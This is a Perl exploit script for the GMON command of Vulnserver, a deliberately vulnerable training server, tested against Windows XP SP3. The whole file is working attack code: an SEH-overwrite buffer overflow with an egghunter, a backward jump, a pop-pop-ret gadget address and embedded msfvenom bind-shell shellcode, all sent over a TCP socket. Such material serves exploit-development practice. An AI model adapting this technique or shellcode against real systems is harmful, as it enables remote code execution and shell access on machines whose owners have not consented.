#!/usr/bin/perl

# Vulnserver GMON exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows XP Professional Version 2002 Service Pack 3 

use IO::Socket;

if($ARGV[1] eq ''){
die("Proper usage: $0 IP_ADDRESS PORT \n\n");
}

$badheader = "GMON /.:/";

# badchars = "\x00"
# msfvenom -p windows/shell_bind_tcp LPORT=80 -b "\x00" -f perl -v baddata ExitFunc=thread
# 355 bytes

$egg = "HAKRHAKR";
$payload = "\xbb\x3f\x17\x13\x95\xdb\xd1\xd9\x74\x24\xf4\x58\x29\xc9" .
"\xb1\x53\x31\x58\x12\x83\xe8\xfc\x03\x67\x19\xf1\x60\x6b" .
"\xcd\x77\x8a\x93\x0e\x18\x02\x76\x3f\x18\x70\xf3\x10\xa8" .
"\xf2\x51\x9d\x43\x56\x41\x16\x21\x7f\x66\x9f\x8c\x59\x49" .
"\x20\xbc\x9a\xc8\xa2\xbf\xce\x2a\x9a\x0f\x03\x2b\xdb\x72" .
"\xee\x79\xb4\xf9\x5d\x6d\xb1\xb4\x5d\x06\x89\x59\xe6\xfb" .
"\x5a\x5b\xc7\xaa\xd1\x02\xc7\x4d\x35\x3f\x4e\x55\x5a\x7a" .
"\x18\xee\xa8\xf0\x9b\x26\xe1\xf9\x30\x07\xcd\x0b\x48\x40" .
"\xea\xf3\x3f\xb8\x08\x89\x47\x7f\x72\x55\xcd\x9b\xd4\x1e" .
"\x75\x47\xe4\xf3\xe0\x0c\xea\xb8\x67\x4a\xef\x3f\xab\xe1" .
"\x0b\xcb\x4a\x25\x9a\x8f\x68\xe1\xc6\x54\x10\xb0\xa2\x3b" .
"\x2d\xa2\x0c\xe3\x8b\xa9\xa1\xf0\xa1\xf0\xad\x35\x88\x0a" .
"\x2e\x52\x9b\x79\x1c\xfd\x37\x15\x2c\x76\x9e\xe2\x53\xad" .
"\x66\x7c\xaa\x4e\x97\x55\x69\x1a\xc7\xcd\x58\x23\x8c\x0d" .
"\x64\xf6\x39\x05\xc3\xa9\x5f\xe8\xb3\x19\xe0\x42\x5c\x70" .
"\xef\xbd\x7c\x7b\x25\xd6\x15\x86\xc6\xd8\xb5\x0f\x20\xb2" .
"\x25\x46\xfa\x2a\x84\xbd\x33\xcd\xf7\x97\x6b\x79\xbf\xf1" .
"\xac\x86\x40\xd4\x9a\x10\xcb\x3b\x1f\x01\xcc\x11\x37\x56" .
"\x5b\xef\xd6\x15\xfd\xf0\xf2\xcd\x9e\x63\x99\x0d\xe8\x9f" .
"\x36\x5a\xbd\x6e\x4f\x0e\x53\xc8\xf9\x2c\xae\x8c\xc2\xf4" .
"\x75\x6d\xcc\xf5\xf8\xc9\xea\xe5\xc4\xd2\xb6\x51\x99\x84" .
"\x60\x0f\x5f\x7f\xc3\xf9\x09\x2c\x8d\x6d\xcf\x1e\x0e\xeb" .
"\xd0\x4a\xf8\x13\x60\x23\xbd\x2c\x4d\xa3\x49\x55\xb3\x53" .
"\xb5\x8c\x77\x73\x54\x04\x82\x1c\xc1\xcd\x2f\x41\xf2\x38" .
"\x73\x7c\x71\xc8\x0c\x7b\x69\xb9\x09\xc7\x2d\x52\x60\x58" .
"\xd8\x54\xd7\x59\xc9";

$baddata = "\x41" x (3369-length($baddata)); 

# egghunter

$baddata .= "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05" .
"\x5a\x74\xef\xb8\x48\x41\x4b\x52\x89\xd7\xaf\x75\xea\xaf" .
"\x75\xe7\xff\xe7";

$baddata .= "\x42" x (3495 - length($baddata)); # exact offset 3499

$baddata .= "\x73\x80\x90\x90"; # JMP backwards 127 bytes

# 0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)

$baddata .= pack('V',0x6250172b);
$baddata .= "\x90" x 12; # NOP sled
$baddata .= $egg.$payload;
$baddata .= "\x43" x (5000-length($baddata));

$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die"Could not connect to server \n";

$socket->recv($sd, 1024);
print $sd;
$socket->send($badheader.$baddata);
